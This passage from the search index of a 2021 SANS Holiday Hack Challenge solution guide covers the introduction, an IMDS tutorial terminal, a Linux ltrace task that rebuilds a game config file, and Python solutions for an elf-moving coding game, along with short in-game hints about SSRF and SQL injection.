{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to KringleCon 4: Calling Birds Introduction Welcome reader, to my 2021 SANS Holiday Hack Challenge Solution Guide. I'm Nutmeg, and this is my fourth year attending KringleCon. First off I want to thank Ed Skoudis, the Counter Hack team, and all of the great KringleCon presenters. As usual, this year's challenge was not only entertaining but also informative and educational, and skills that I learned while participating I feel will be directly relevant to my career as a CyberSecurity Professional. I also want to thank my wife Kim, who once again put up with being a 'KringleCon Widow' for several weeks during the holiday season so I could indulge myself in this event. Lastly, I'd like to recognize last year's Best Overall Runner Up, Neal Eikenberry (malcrypt), whose walkthrough and markup source provided me with a great starting point and ideas for how to do my report this year. Report Format Prior to this year I have submitted my reports as PDF documents written using Microsoft Word, and each year I conclude that I never want to do that to myself again. So this year I am following the practice of several winners from previous years and created this report using Material for MkDocs , hosted on GitHub Pages. As a PDF it was easy to know how many pages previous submissions were, but as a web site this is harder to determine. It's also more difficult as a web site (and in my opinion undesirable) to try to control things like font sizes, margins, page breaks, etc. So in an effort to honor the spirit of the 50 page submission requirement as best I can this guide is broken into the following sections. Objectives: These are solutions to the main objectives and should be considered the primary content of this guide. Additionally, information that is not directly related to the solution, such as elf / troll dialog, hints, and supporting screenshots are collapsed by default. Terminal Challenges: These are the elf / troll challenges that provide hints for the main objectives. Links exist that cross reference them with their respective objectives, but the challenges themselves can be considered extra content. Extras: This is truly extra content that might be helpful or was just amusing enough that I thought should be documented. Not included: Other story / play-through elements, such as maps, dialog with Santa and other characters, the narrative and storyline, etc., are not part of this guide. Honestly, these are things that I feel should be experienced by the player and is why I refer to this as a Solutions Guide rather than a Walkthrough. My hope is that the above steps result in a guide that is is sufficiently detailed to help someone understand and complete the objectives, provides additional detail for those that want to dig deeper, and respects the time and efforts of the team that needs to read through and evaluate hundreds of submissions. Software and Tools The main operating system used was Windows 11. For some of the challenges where a Linux environment was more convenient (Objective 8 in particular) I used the new Windows Subsystem for Linux preview with an Ubuntu distro. For Objective 12 I found it helpful to create a local version of the Frost Tower Website on a full Ubuntu virtual machine running in VirtualBox . At some point or another I used the Chrome , Firefox , and Brave web browsers. As mentioned earlier, this writeup was created using Material for MkDocs . Screenshots were taken using ShareX , and code editing was done with Visual Studio Code .","title":"Welcome"},{"location":"#welcome-to-kringlecon-4-calling-birds","text":"","title":"Welcome to KringleCon 4: Calling Birds"},{"location":"#introduction","text":"Welcome reader, to my 2021 SANS Holiday Hack Challenge Solution Guide. I'm Nutmeg, and this is my fourth year attending KringleCon. First off I want to thank Ed Skoudis, the Counter Hack team, and all of the great KringleCon presenters. As usual, this year's challenge was not only entertaining but also informative and educational, and skills that I learned while participating I feel will be directly relevant to my career as a CyberSecurity Professional. I also want to thank my wife Kim, who once again put up with being a 'KringleCon Widow' for several weeks during the holiday season so I could indulge myself in this event. Lastly, I'd like to recognize last year's Best Overall Runner Up, Neal Eikenberry (malcrypt), whose walkthrough and markup source provided me with a great starting point and ideas for how to do my report this year.","title":"Introduction"},{"location":"#report-format","text":"Prior to this year I have submitted my reports as PDF documents written using Microsoft Word, and each year I conclude that I never want to do that to myself again. So this year I am following the practice of several winners from previous years and created this report using Material for MkDocs , hosted on GitHub Pages. As a PDF it was easy to know how many pages previous submissions were, but as a web site this is harder to determine. It's also more difficult as a web site (and in my opinion undesirable) to try to control things like font sizes, margins, page breaks, etc. So in an effort to honor the spirit of the 50 page submission requirement as best I can this guide is broken into the following sections. Objectives: These are solutions to the main objectives and should be considered the primary content of this guide. Additionally, information that is not directly related to the solution, such as elf / troll dialog, hints, and supporting screenshots are collapsed by default. Terminal Challenges: These are the elf / troll challenges that provide hints for the main objectives. Links exist that cross reference them with their respective objectives, but the challenges themselves can be considered extra content. Extras: This is truly extra content that might be helpful or was just amusing enough that I thought should be documented. Not included: Other story / play-through elements, such as maps, dialog with Santa and other characters, the narrative and storyline, etc., are not part of this guide. Honestly, these are things that I feel should be experienced by the player and is why I refer to this as a Solutions Guide rather than a Walkthrough. My hope is that the above steps result in a guide that is is sufficiently detailed to help someone understand and complete the objectives, provides additional detail for those that want to dig deeper, and respects the time and efforts of the team that needs to read through and evaluate hundreds of submissions.","title":"Report Format"},{"location":"#software-and-tools","text":"The main operating system used was Windows 11. For some of the challenges where a Linux environment was more convenient (Objective 8 in particular) I used the new Windows Subsystem for Linux preview with an Ubuntu distro. For Objective 12 I found it helpful to create a local version of the Frost Tower Website on a full Ubuntu virtual machine running in VirtualBox . At some point or another I used the Chrome , Firefox , and Brave web browsers. As mentioned earlier, this writeup was created using Material for MkDocs . Screenshots were taken using ShareX , and code editing was done with Visual Studio Code .","title":"Software and Tools"},{"location":"challenges/T10_IMDS_Exploration/","text":"IMDS Exploration Terminal Challenge Troll Introduction Help Noxious O'Dor in Jack's Executive Restroom Hey, this is the executive restroom. Wasn't that door closed? I\u2019m Noxious O\u2019Dor. And I\u2019ve gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I\u2019m having some trouble with this IMDS exploration. I\u2019m hoping you can give me some help in solving it. If you do, I\u2019ll be happy to trade you for some hints on SSRF! I\u2019ve been studying up on that and have some good ideas on how to attack it! Open the Terminal Open the IMDS Exploration terminal in Jack's Restroom Solution This challenge is simply a tutorial on IMDS and there are no problems to solve. Simply open the terminal and go through the steps to learn about IDMS (which will be useful for Objective 10 ). Completion Talk to Noxious to receive hints for Objective 10) Now Hiring! Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading.","title":"Noxious ODor - IMDS Exploration"},{"location":"challenges/T10_IMDS_Exploration/#imds-exploration-terminal-challenge","text":"","title":"IMDS Exploration Terminal Challenge"},{"location":"challenges/T10_IMDS_Exploration/#troll-introduction","text":"Help Noxious O'Dor in Jack's Executive Restroom Hey, this is the executive restroom. Wasn't that door closed? I\u2019m Noxious O\u2019Dor. And I\u2019ve gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I\u2019m having some trouble with this IMDS exploration. I\u2019m hoping you can give me some help in solving it. If you do, I\u2019ll be happy to trade you for some hints on SSRF! I\u2019ve been studying up on that and have some good ideas on how to attack it!","title":"Troll Introduction"},{"location":"challenges/T10_IMDS_Exploration/#open-the-terminal","text":"Open the IMDS Exploration terminal in Jack's Restroom","title":"Open the Terminal"},{"location":"challenges/T10_IMDS_Exploration/#solution","text":"This challenge is simply a tutorial on IMDS and there are no problems to solve. Simply open the terminal and go through the steps to learn about IDMS (which will be useful for Objective 10 ).","title":"Solution"},{"location":"challenges/T10_IMDS_Exploration/#completion","text":"Talk to Noxious to receive hints for Objective 10) Now Hiring! Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading.","title":"Completion"},{"location":"challenges/T11_Strace_Ltrace_Retrace/","text":"Strace, Ltrace, Retrace Terminal Challenge Elf Introduction Help Tinsel Upatree in the Kitchen Hiya hiya, I'm Tinsel Upatree! Say, do you know what's going on next door? I'm a bit worried about the whole FrostFest event. It feels a bit... ill-conceived, somehow. Nasty even. Well, regardless \u2013 and more to the point, what do you know about tracing processes in Linux? We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we seem to be missing a file. Do you think you can use strace or ltrace to help us rebuild the missing config? We'd like to help some of our favorite children enjoy the sweet spun goodness again! And, if you help me with this, I\u2019ll give you some hints about using Wireshark filters to look for unusual options that might help you achieve Objectives here at the North Pole. Hints and Other Resources Other Resources How to use strace and ltrace commands in Linux https://www.thegeekdiary.com/how-to-use-strace-and-ltrace-commands-in-linux/ Open the Terminal Open the Strace, Ltrace, Retrace terminal in the Kitchen Screenshot Solution We start by looking at the files available, and find that there is a single executable file named 'make_the_candy'. Running this file gives us an message that it cannot open the configuration file. Screenshot Both the strace and ltrace commands can be used to debug the execution of a program. Both commands have their own particular uses, but for this objective we can use ltrace exclusively. First, run the program while tracing it's execution ltrace -f ./make_the_candy Screenshot The output tells us that the program is trying to open the file registration.json . So, let's create a file with that name containing some random content and run the command again. echo Nutmeg > registration.json ltrace -f ./make_the_candy Screenshot Now we see that the program has opened and read 'registration.json', and is next using the strstr function to match the contents against the string 'Registration'. So, we will make that the content of the file and try again. echo Registration > registration.json ltrace -f ./make_the_candy Screenshot Now we see that it is using the strchr function to find the ':' character following 'Registration'. Repeating this process we determine that the string the program is looking for in the registration file is 'Registration:True'. Screenshot Completion Talk to Tinsel after getting the candy machine working to receieve hints for Objective 11) Customer Complaint Analysis I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword.","title":"Tinsel Upatree - Strace, Ltrace, Retrace"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#strace-ltrace-retrace-terminal-challenge","text":"","title":"Strace, Ltrace, Retrace Terminal Challenge"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#elf-introduction","text":"Help Tinsel Upatree in the Kitchen Hiya hiya, I'm Tinsel Upatree! Say, do you know what's going on next door? I'm a bit worried about the whole FrostFest event. It feels a bit... ill-conceived, somehow. Nasty even. Well, regardless \u2013 and more to the point, what do you know about tracing processes in Linux? We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we seem to be missing a file. Do you think you can use strace or ltrace to help us rebuild the missing config? We'd like to help some of our favorite children enjoy the sweet spun goodness again! And, if you help me with this, I\u2019ll give you some hints about using Wireshark filters to look for unusual options that might help you achieve Objectives here at the North Pole.","title":"Elf Introduction"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#hints-and-other-resources","text":"Other Resources How to use strace and ltrace commands in Linux https://www.thegeekdiary.com/how-to-use-strace-and-ltrace-commands-in-linux/","title":"Hints and Other Resources"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#open-the-terminal","text":"Open the Strace, Ltrace, Retrace terminal in the Kitchen Screenshot","title":"Open the Terminal"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#solution","text":"We start by looking at the files available, and find that there is a single executable file named 'make_the_candy'. Running this file gives us an message that it cannot open the configuration file. Screenshot Both the strace and ltrace commands can be used to debug the execution of a program. Both commands have their own particular uses, but for this objective we can use ltrace exclusively. First, run the program while tracing it's execution ltrace -f ./make_the_candy Screenshot The output tells us that the program is trying to open the file registration.json . So, let's create a file with that name containing some random content and run the command again. echo Nutmeg > registration.json ltrace -f ./make_the_candy Screenshot Now we see that the program has opened and read 'registration.json', and is next using the strstr function to match the contents against the string 'Registration'. So, we will make that the content of the file and try again. echo Registration > registration.json ltrace -f ./make_the_candy Screenshot Now we see that it is using the strchr function to find the ':' character following 'Registration'. Repeating this process we determine that the string the program is looking for in the registration file is 'Registration:True'. Screenshot","title":"Solution"},{"location":"challenges/T11_Strace_Ltrace_Retrace/#completion","text":"Talk to Tinsel after getting the candy machine working to receieve hints for Objective 11) Customer Complaint Analysis I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword.","title":"Completion"},{"location":"challenges/T12_Elf_Code_Python/","text":"Elf Code Python Terminal Challenge Elf Introduction Help Rib Bonbowford in the Dining Room Hello, I'm Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This here machine lets you control an Elf using Python 3. It\u2019s pretty fun, but I\u2019m having trouble getting beyond Level 8. Tell you what\u2026 if you help me get past Level 8, I\u2019ll share some of my SQLi tips with you. You may find them handy sometime around the North Pole this season. Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () . Hints and Other Resources Hints from talking with Rib Lever Requirements Not sure what a lever requires? Click it in the Current Level Objectives panel. Moving the Elf You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Bumping into Walls Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. Function Calls You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () . Other Resources The Ultimate Python Beginners's Handbook https://www.freecodecamp.org/news/the-python-guide-for-beginners/ Open the Terminal Open the Elf Code Python game in the Dining Room Screenshot Solution For this challenge you must write Python code for each level to guide the elf to his objective. Level 1 - Get Moving Move the elf to collect the lollipops and get to the KringleCon entrance at dict location {\"x\":2,\"y\":2} Use no more than 8 lines of code and 6 object function calls. 1 2 3 4 5 import elf , munchkins , levers , lollipops , yeeters , pits lollipop0 = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit ) Level 2 - Get moveTo'ing Move the elf to collect the lollipops and get to the KringleCon entrance. Use no more than 10 lines of code and 6 object function calls. 1 2 3 4 5 6 7 import elf , munchkins , levers , lollipops , yeeters , pits lollipop0 = lollipops . get ( 0 ) lollipop1 = lollipops . get ( 1 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lollipop1 . position ) elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit ) Level 3 - Don't Get Yeeted! Move the elf to collect the lollipops and get to the KringleCon entrance. Use no more than 10 lines of code and 6 object function calls. 1 2 3 4 5 6 7 8 9 import elf , munchkins , levers , lollipops , yeeters , pits lever0 = levers . get ( 0 ) lever0_answer = lever0 . data () + 2 lollipop0 = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( levers . get ( 0 ) . position ) lever0 . pull ( lever0_answer ) elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit ) Level 4 - Data Types Pull ALL of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Use no more than 18 lines of code and 15 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lever4 . position ) lever4 . pull ( \"A String\" ) elf . moveTo ( lever3 . position ) lever3 . pull ( True ) elf . moveTo ( lever2 . position ) lever2 . pull ( 3.14 ) elf . moveTo ( lever1 . position ) lever1 . pull (( \"obj1\" , \"obj2\" )) elf . moveTo ( lever0 . position ) lever0 . pull ({ \"a\" : 1 , \"b\" : 2 }) elf . moveTo ( exit ) Level 5 - Conversions and Comparisons Pull all of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Use no more than 23 lines of code and 18 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () exit = { \"x\" : 2 , \"y\" : 2 } lever4_answer = lever4 . data () + \" concatenate\" elf . moveTo ( lever4 . position ) lever4 . pull ( lever4_answer ) lever3_answer = not ( lever3 . data ()) elf . moveTo ( lever3 . position ) lever3 . pull ( lever3_answer ) lever2_answer = int ( lever2 . data ()) + 1 elf . moveTo ( lever2 . position ) lever2 . pull ( lever2_answer ) lever1_data = lever1 . data () lever1_data . append ( 1 ) elf . moveTo ( lever1 . position ) lever1 . pull ( lever1_data ) lever0_data = lever0 . data () lever0_data [ \"strkey\" ] = \"strvalue\" elf . moveTo ( lever0 . position ) lever0 . pull ( lever0_data ) elf . moveTo ( exit ) Level 6 - Types and Conditionals Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). Use no more than 23 lines of code and 6 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) data = lever . data () exit = { \"x\" : 2 , \"y\" : 2 } if type ( data ) == bool : answer = not data elif type ( data ) == int : answer = data * 2 elif type ( data ) == list : answer = [] for i in data : answer . append ( i + 1 ) elif type ( data ) == str : answer = data + data elif type ( data ) == dict : answer = {} answer [ \"a\" ] = data [ \"a\" ] + 1 elf . moveTo ( lever . position ) lever . pull ( answer ) elf . moveTo ( exit ) Level 7 - Up Down Loopiness Navigate through the obstacles and collect the lollipop before arriving at the KringleCon entrance. Use no more than 12 lines of code and 12 object function calls. 1 2 3 4 5 6 7 8 9 10 import elf , munchkins , levers , lollipops , yeeters , pits lollipop = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } for num in range ( 2 ): elf . moveLeft ( 2 ) elf . moveUp ( 11 ) elf . moveLeft ( 2 ) elf . moveDown ( 11 ) elf . moveTo ( lollipop . position ) elf . moveTo ( exit ) Level 8 - Two Paths, Your Choice Navigate past the obstacles and avoid the munchkin watching the KringleCon entrance. Use no more than 12 lines of code and 10 object function calls. Lever Path Munchkin Path 1 2 3 4 5 6 7 8 9 10 11 12 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) lever_question = lever . data () lever_answer = [ 'munchkins rule' ] + lever_question exit = { \"x\" : 2 , \"y\" : 2 } all_lollipops = lollipops . get () for lollipop in all_lollipops : elf . moveTo ( lollipop . position ) elf . moveTo ( lever . position ) lever . pull ( lever_answer ) elf . moveDown ( 3 ) elf . moveTo ( exit ) 1 2 3 4 5 6 7 8 9 10 11 import elf , munchkins , levers , lollipops , yeeters , pits exit = { \"x\" : 2 , \"y\" : 2 } munchkin = munchkins . get ( 0 ) question = munchkin . ask () for key in question : if question [ key ] == 'lollipop' : munchkin . answer ( key ) all_lollipops = lollipops . get () for lollipop in all_lollipops : elf . moveTo ( lollipop . position ) elf . moveTo ( exit ) Completion Talk to Rib to receive hints for Objective 12) Frost Tower Website Checkup Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code. Bonus Level 9 - Yeeter Swirl Follow the swirl being careful not to step on any traps (or get yeeted off the map). Note: The elf.moveTo(object) function has been disabled for this challenge. Use no more than 27 lines of code and 25 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import elf , munchkins , levers , lollipops , yeeters , pits def func_to_pass_to_munchkin ( list_of_lists ): total = 0 for list in list_of_lists : for element in list : if type ( element ) == int : total = total + element return total munchkin = munchkins . get ( 0 ) all_levers = levers . get () moves = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] * 2 for i , move in enumerate ( moves ): move ( i + 1 ) if i < len ( all_levers ): all_levers [ i ] . pull ( i ) elf . moveUp ( 2 ) elf . moveLeft ( 4 ) munchkin . answer ( func_to_pass_to_munchkin ) elf . moveUp ( 1 ) Bonus Level 10 - Munchkin Dodging Finale Dodge the munchkins to get to the KringleCon entrance. Use no more than 17 lines of code and 15 object function calls. 1 2 3 4 5 6 7 8 9 10 import elf , munchkins , levers , lollipops , yeeters , pits import time muns = munchkins . get () lols = lollipops . get ()[:: - 1 ] exit = { \"x\" : 2 , \"y\" : 2 } for index , mun in enumerate ( muns ): while ( abs ( elf . position [ \"x\" ] - muns [ index ] . position [ \"x\" ])) < 6 : time . sleep ( 0.05 ) elf . moveTo ( lols [ index ] . position ) elf . moveTo ( exit )","title":"Rib Bonbowford - Elf Code Python"},{"location":"challenges/T12_Elf_Code_Python/#elf-code-python-terminal-challenge","text":"","title":"Elf Code Python Terminal Challenge"},{"location":"challenges/T12_Elf_Code_Python/#elf-introduction","text":"Help Rib Bonbowford in the Dining Room Hello, I'm Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This here machine lets you control an Elf using Python 3. It\u2019s pretty fun, but I\u2019m having trouble getting beyond Level 8. Tell you what\u2026 if you help me get past Level 8, I\u2019ll share some of my SQLi tips with you. You may find them handy sometime around the North Pole this season. Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () .","title":"Elf Introduction"},{"location":"challenges/T12_Elf_Code_Python/#hints-and-other-resources","text":"Hints from talking with Rib Lever Requirements Not sure what a lever requires? Click it in the Current Level Objectives panel. Moving the Elf You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Bumping into Walls Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. Function Calls You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () . Other Resources The Ultimate Python Beginners's Handbook https://www.freecodecamp.org/news/the-python-guide-for-beginners/","title":"Hints and Other Resources"},{"location":"challenges/T12_Elf_Code_Python/#open-the-terminal","text":"Open the Elf Code Python game in the Dining Room Screenshot","title":"Open the Terminal"},{"location":"challenges/T12_Elf_Code_Python/#solution","text":"For this challenge you must write Python code for each level to guide the elf to his objective.","title":"Solution"},{"location":"challenges/T12_Elf_Code_Python/#level-1-get-moving","text":"Move the elf to collect the lollipops and get to the KringleCon entrance at dict location {\"x\":2,\"y\":2} Use no more than 8 lines of code and 6 object function calls. 1 2 3 4 5 import elf , munchkins , levers , lollipops , yeeters , pits lollipop0 = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit )","title":"Level 1 - Get Moving"},{"location":"challenges/T12_Elf_Code_Python/#level-2-get-movetoing","text":"Move the elf to collect the lollipops and get to the KringleCon entrance. Use no more than 10 lines of code and 6 object function calls. 1 2 3 4 5 6 7 import elf , munchkins , levers , lollipops , yeeters , pits lollipop0 = lollipops . get ( 0 ) lollipop1 = lollipops . get ( 1 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lollipop1 . position ) elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit )","title":"Level 2 - Get moveTo'ing"},{"location":"challenges/T12_Elf_Code_Python/#level-3-dont-get-yeeted","text":"Move the elf to collect the lollipops and get to the KringleCon entrance. Use no more than 10 lines of code and 6 object function calls. 1 2 3 4 5 6 7 8 9 import elf , munchkins , levers , lollipops , yeeters , pits lever0 = levers . get ( 0 ) lever0_answer = lever0 . data () + 2 lollipop0 = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( levers . get ( 0 ) . position ) lever0 . pull ( lever0_answer ) elf . moveTo ( lollipop0 . position ) elf . moveTo ( exit )","title":"Level 3 - Don't Get Yeeted!"},{"location":"challenges/T12_Elf_Code_Python/#level-4-data-types","text":"Pull ALL of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Use no more than 18 lines of code and 15 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () exit = { \"x\" : 2 , \"y\" : 2 } elf . moveTo ( lever4 . position ) lever4 . pull ( \"A String\" ) elf . moveTo ( lever3 . position ) lever3 . pull ( True ) elf . moveTo ( lever2 . position ) lever2 . pull ( 3.14 ) elf . moveTo ( lever1 . position ) lever1 . pull (( \"obj1\" , \"obj2\" )) elf . moveTo ( lever0 . position ) lever0 . pull ({ \"a\" : 1 , \"b\" : 2 }) elf . moveTo ( exit )","title":"Level 4 - Data Types"},{"location":"challenges/T12_Elf_Code_Python/#level-5-conversions-and-comparisons","text":"Pull all of the levers by submitting the requested data for each using lever.pull(data) to disable the Yeeter trap at the KringleCon entrance. Use no more than 23 lines of code and 18 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () exit = { \"x\" : 2 , \"y\" : 2 } lever4_answer = lever4 . data () + \" concatenate\" elf . moveTo ( lever4 . position ) lever4 . pull ( lever4_answer ) lever3_answer = not ( lever3 . data ()) elf . moveTo ( lever3 . position ) lever3 . pull ( lever3_answer ) lever2_answer = int ( lever2 . data ()) + 1 elf . moveTo ( lever2 . position ) lever2 . pull ( lever2_answer ) lever1_data = lever1 . data () lever1_data . append ( 1 ) elf . moveTo ( lever1 . position ) lever1 . pull ( lever1_data ) lever0_data = lever0 . data () lever0_data [ \"strkey\" ] = \"strvalue\" elf . moveTo ( lever0 . position ) lever0 . pull ( lever0_data ) elf . moveTo ( exit )","title":"Level 5 - Conversions and Comparisons"},{"location":"challenges/T12_Elf_Code_Python/#level-6-types-and-conditionals","text":"Move the elf to the lever. Get the lever data lever.data() and perform the appropriate action to the data. Submit the modified data using lever.pull(modified_data). Use no more than 23 lines of code and 6 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) data = lever . data () exit = { \"x\" : 2 , \"y\" : 2 } if type ( data ) == bool : answer = not data elif type ( data ) == int : answer = data * 2 elif type ( data ) == list : answer = [] for i in data : answer . append ( i + 1 ) elif type ( data ) == str : answer = data + data elif type ( data ) == dict : answer = {} answer [ \"a\" ] = data [ \"a\" ] + 1 elf . moveTo ( lever . position ) lever . pull ( answer ) elf . moveTo ( exit )","title":"Level 6 - Types and Conditionals"},{"location":"challenges/T12_Elf_Code_Python/#level-7-up-down-loopiness","text":"Navigate through the obstacles and collect the lollipop before arriving at the KringleCon entrance. Use no more than 12 lines of code and 12 object function calls. 1 2 3 4 5 6 7 8 9 10 import elf , munchkins , levers , lollipops , yeeters , pits lollipop = lollipops . get ( 0 ) exit = { \"x\" : 2 , \"y\" : 2 } for num in range ( 2 ): elf . moveLeft ( 2 ) elf . moveUp ( 11 ) elf . moveLeft ( 2 ) elf . moveDown ( 11 ) elf . moveTo ( lollipop . position ) elf . moveTo ( exit )","title":"Level 7 - Up Down Loopiness"},{"location":"challenges/T12_Elf_Code_Python/#level-8-two-paths-your-choice","text":"Navigate past the obstacles and avoid the munchkin watching the KringleCon entrance. Use no more than 12 lines of code and 10 object function calls. Lever Path Munchkin Path 1 2 3 4 5 6 7 8 9 10 11 12 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) lever_question = lever . data () lever_answer = [ 'munchkins rule' ] + lever_question exit = { \"x\" : 2 , \"y\" : 2 } all_lollipops = lollipops . get () for lollipop in all_lollipops : elf . moveTo ( lollipop . position ) elf . moveTo ( lever . position ) lever . pull ( lever_answer ) elf . moveDown ( 3 ) elf . moveTo ( exit ) 1 2 3 4 5 6 7 8 9 10 11 import elf , munchkins , levers , lollipops , yeeters , pits exit = { \"x\" : 2 , \"y\" : 2 } munchkin = munchkins . get ( 0 ) question = munchkin . ask () for key in question : if question [ key ] == 'lollipop' : munchkin . answer ( key ) all_lollipops = lollipops . get () for lollipop in all_lollipops : elf . moveTo ( lollipop . position ) elf . moveTo ( exit )","title":"Level 8 - Two Paths, Your Choice"},{"location":"challenges/T12_Elf_Code_Python/#completion","text":"Talk to Rib to receive hints for Objective 12) Frost Tower Website Checkup Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code.","title":"Completion"},{"location":"challenges/T12_Elf_Code_Python/#bonus-level-9-yeeter-swirl","text":"Follow the swirl being careful not to step on any traps (or get yeeted off the map). Note: The elf.moveTo(object) function has been disabled for this challenge. Use no more than 27 lines of code and 25 object function calls. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import elf , munchkins , levers , lollipops , yeeters , pits def func_to_pass_to_munchkin ( list_of_lists ): total = 0 for list in list_of_lists : for element in list : if type ( element ) == int : total = total + element return total munchkin = munchkins . get ( 0 ) all_levers = levers . get () moves = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] * 2 for i , move in enumerate ( moves ): move ( i + 1 ) if i < len ( all_levers ): all_levers [ i ] . pull ( i ) elf . moveUp ( 2 ) elf . moveLeft ( 4 ) munchkin . answer ( func_to_pass_to_munchkin ) elf . moveUp ( 1 )","title":"Bonus Level 9 - Yeeter 